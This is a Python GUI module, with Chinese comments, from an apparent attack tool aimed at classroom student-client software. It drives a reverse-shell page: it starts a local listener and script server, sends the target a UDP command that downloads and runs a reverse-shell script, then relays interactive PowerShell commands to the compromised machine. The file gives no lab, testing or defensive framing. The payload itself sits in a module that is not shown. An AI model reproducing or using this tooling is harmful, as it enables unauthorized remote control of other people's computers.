"""反弹终端页：本机监听，让目标主动连回来形成一条可交互的命令行。"""

from PySide6.QtCore import Qt, QTimer
from PySide6.QtGui import QFont, QTextCursor
from PySide6.QtWidgets import QHBoxLayout, QLineEdit
from qfluentwidgets import BodyLabel, CaptionLabel, PlainTextEdit, PushButton
from qfluentwidgets import FluentIcon as FIF

import app.features.shell.service as shell_service
from app.gui.widgets.common import SectionCard, TargetControls, page_heading
from app.gui.widgets.page import Page

# 轮询间隔：既不会让输出看起来一顿一顿，也不至于空转占满 CPU。
POLL_INTERVAL = 120
# 控制台最小高度：窗口再矮也留出能看清几行输出的空间。
CONSOLE_MIN_HEIGHT = 260


class ShellPage(Page):
    """监听目标回连并提供交互式命令行。

    远端只执行一条很短的下载命令，真正的反弹脚本由本机 HTTP 服务提供，
    因此不需要在目标上留文件，也不依赖任何第三方短链。目标与其他远程
    攻击页面共用，本机地址与监听端口由程序自动选择，页面上不再重复填写。
    """

    def __init__(self, state, logs, parent=None):
        super().__init__("shell", parent)
        self.state = state
        self.logs = logs
        self.server = None
        # 记录上一次的连接状态与来源，只在状态变化时写日志。
        self._connected = False
        self._address = ""
        page_heading(self.vbox, "反弹终端")
        hint = BodyLabel(
            "远程攻击：目标主动连回本机，得到一条可持续交互的命令行。", self
        )
        hint.setWordWrap(True)
        self.vbox.addWidget(hint)

        # 目标与端口来自远程攻击共用的连接状态，和其它页面保持一致。
        self.target_card = SectionCard(self)
        self.targets = TargetControls(state, self.target_card, show_round_options=False)
        self.target_card.body.addWidget(self.targets)
        self.vbox.addWidget(self.target_card)

        self.terminal_card = SectionCard(self, spacing=10)
        toolbar = QHBoxLayout()
        toolbar.setSpacing(8)
        toolbar.addWidget(BodyLabel("终端会话", self.terminal_card))
        toolbar.addStretch()
        self.listen_button = PushButton(FIF.CONNECT, "开始监听", self.terminal_card)
        self.listen_button.setMinimumHeight(34)
        self.listen_button.clicked.connect(self.toggle_listen)
        toolbar.addWidget(self.listen_button)
        self.link_button = PushButton(FIF.SEND, "发送连接命令", self.terminal_card)
        self.link_button.setMinimumHeight(34)
        self.link_button.clicked.connect(self.send_connect_command)
        toolbar.addWidget(self.link_button)
        self.terminal_card.body.addLayout(toolbar)

        self.status = CaptionLabel("未监听", self.terminal_card)
        self.status.setWordWrap(True)
        self.terminal_card.body.addWidget(self.status)

        self.console = PlainTextEdit(self.terminal_card)
        self.console.setReadOnly(True)
        self.console.setMinimumHeight(CONSOLE_MIN_HEIGHT)
        self.console.setFont(QFont("Consolas", 10))
        self.terminal_card.body.addWidget(self.console, 1)

        command_row = QHBoxLayout()
        command_row.setSpacing(8)
        self.command_row = command_row
        self.command_input = QLineEdit(self.terminal_card)
        self.command_input.setPlaceholderText("连接建立后在这里输入命令，回车发送")
        self.command_input.returnPressed.connect(self.send_line)
        command_row.addWidget(self.command_input, 1)
        self.command_button = PushButton(FIF.PLAY, "发送", self.terminal_card)
        self.command_button.clicked.connect(self.send_line)
        command_row.addWidget(self.command_button)
        self.terminal_card.body.addLayout(command_row)
        self.vbox.addWidget(self.terminal_card, 1)

        # 输出由后台线程写入队列，界面按固定节奏取，避免跨线程碰控件。
        self.timer = QTimer(self)
        self.timer.setInterval(POLL_INTERVAL)
        self.timer.timeout.connect(self._poll)
        self._set_command_enabled(False)

    # ---- 目标 -------------------------------------------------------------

    def target_host(self):
        """返回当前共享目标的解析结果，没填时为空字符串。"""
        value = self.state.values["target"].strip()
        if not value:
            return ""
        try:
            return self.state.resolve_target(value)
        except ValueError:
            return ""

    def udp_port(self):
        """返回共享状态里的学生端 UDP 端口。"""
        return int(self.state.values["port"])

    # ---- 监听与连接 -------------------------------------------------------

    def toggle_listen(self):
        """开始或停止监听。"""
        if self.server is not None:
            self.stop_listen()
            return
        host = self.target_host()
        server = shell_service.ShellServer(port=0, local_ip=None, target=host or None)
        try:
            server.start()
        except OSError as error:
            self.logs.error("反弹终端", "监听失败", "异常：%s" % error)
            self.status.setText("监听失败：%s" % error)
            return
        self.server = server
        self.listen_button.setText("停止监听")
        self._refresh_status()
        self._append(
            "已在本机 %s:%d 监听，脚本服务端口 %d\n"
            % (server.callback_host(), server.port, server.http_port)
        )
        self.timer.start()
        self.logs.info(
            "反弹终端",
            "开始监听",
            "TCP 端口：%d；脚本服务端口：%d；本机地址：%s"
            % (server.port, server.http_port, server.callback_host()),
        )

    def stop_listen(self):
        """断开目标并停止监听。"""
        if self.server is None:
            return
        port = self.server.port
        self.server.close()
        self.server = None
        self._connected = False
        self._address = ""
        self.timer.stop()
        self.listen_button.setText("开始监听")
        self.status.setText("未监听")
        self._set_command_enabled(False)
        self.logs.info("反弹终端", "停止监听", "TCP 端口：%d" % port)

    def send_connect_command(self):
        """把下载并执行反弹脚本的命令发给目标。"""
        if self.server is None:
            self.status.setText("请先开始监听")
            return
        host = self.target_host()
        if not host:
            self.targets.target_input.setError(True)
            self.targets.target_input.segments[-1].setFocus()
            self.status.setText("请先填写目标设备")
            return
        # 目标可能刚被改过，让回调地址按新目标重新挑选出口网卡。
        self.server.target = host
        try:
            command = self.server.command()
        except ValueError as error:
            self.status.setText(str(error))
            return
        try:
            sent = shell_service.send_command(host, command, port=self.udp_port())
        except (OSError, ValueError) as error:
            self.logs.error(
                "反弹终端", "连接命令发送失败", "目标：%s；异常：%s" % (host, error)
            )
            self.status.setText("发送失败：%s" % error)
            return
        self.status.setText("已向 %s 发送连接命令，等待回连" % host)
        self._append("→ %s 已发送连接命令（%d 字节）\n" % (host, sent))
        self.logs.info(
            "反弹终端",
            "发送连接命令",
            "目标：%s；学生端端口：%d；命令长度：%d 字节"
            % (host, self.udp_port(), sent),
        )

    def send_line(self):
        """把输入框里的一行命令发给目标。"""
        if self.server is None:
            return
        text = self.command_input.text()
        if not text.strip():
            return
        if not self.server.send(text):
            self.status.setText("目标尚未连回，命令没有发出")
            return
        self._append("PS> %s\n" % text)
        self.command_input.clear()
        self.logs.debug(
            "反弹终端", "发送命令", "目标：%s；命令：%s" % (self.server.address, text)
        )

    def _refresh_status(self):
        """按监听与连接状态写一行摘要。"""
        if self.server is None:
            self.status.setText("未监听")
            return
        if self.server.connected:
            self.status.setText("已连接 %s" % self.server.address)
            return
        self.status.setText(
            "监听 0.0.0.0:%d，本机地址 %s，等待目标连回"
            % (self.server.port, self.server.callback_host())
        )

    def _poll(self):
        """取出后台积攒的输出并刷新状态。"""
        if self.server is None:
            return
        data = self.server.poll()
        if data:
            self._append(data)
        connected = self.server.connected
        if connected != self._connected:
            if connected:
                self.logs.info(
                    "反弹终端", "目标已连回", "来源：%s" % self.server.address
                )
            else:
                self.logs.warning(
                    "反弹终端", "目标连接断开", "上一次来源：%s" % self._address
                )
            self._connected = connected
            self._address = self.server.address
        self._set_command_enabled(connected)
        self._refresh_status()

    def _append(self, text):
        """把文本追加到输出区并滚到末尾。"""
        self.console.moveCursor(QTextCursor.MoveOperation.End)
        self.console.insertPlainText(text)
        self.console.moveCursor(QTextCursor.MoveOperation.End)

    def _set_command_enabled(self, enabled):
        """没有连接时禁用命令输入。"""
        self.command_input.setEnabled(enabled)
        self.command_button.setEnabled(enabled)
        if enabled:
            self.command_input.setFocus(Qt.FocusReason.OtherFocusReason)
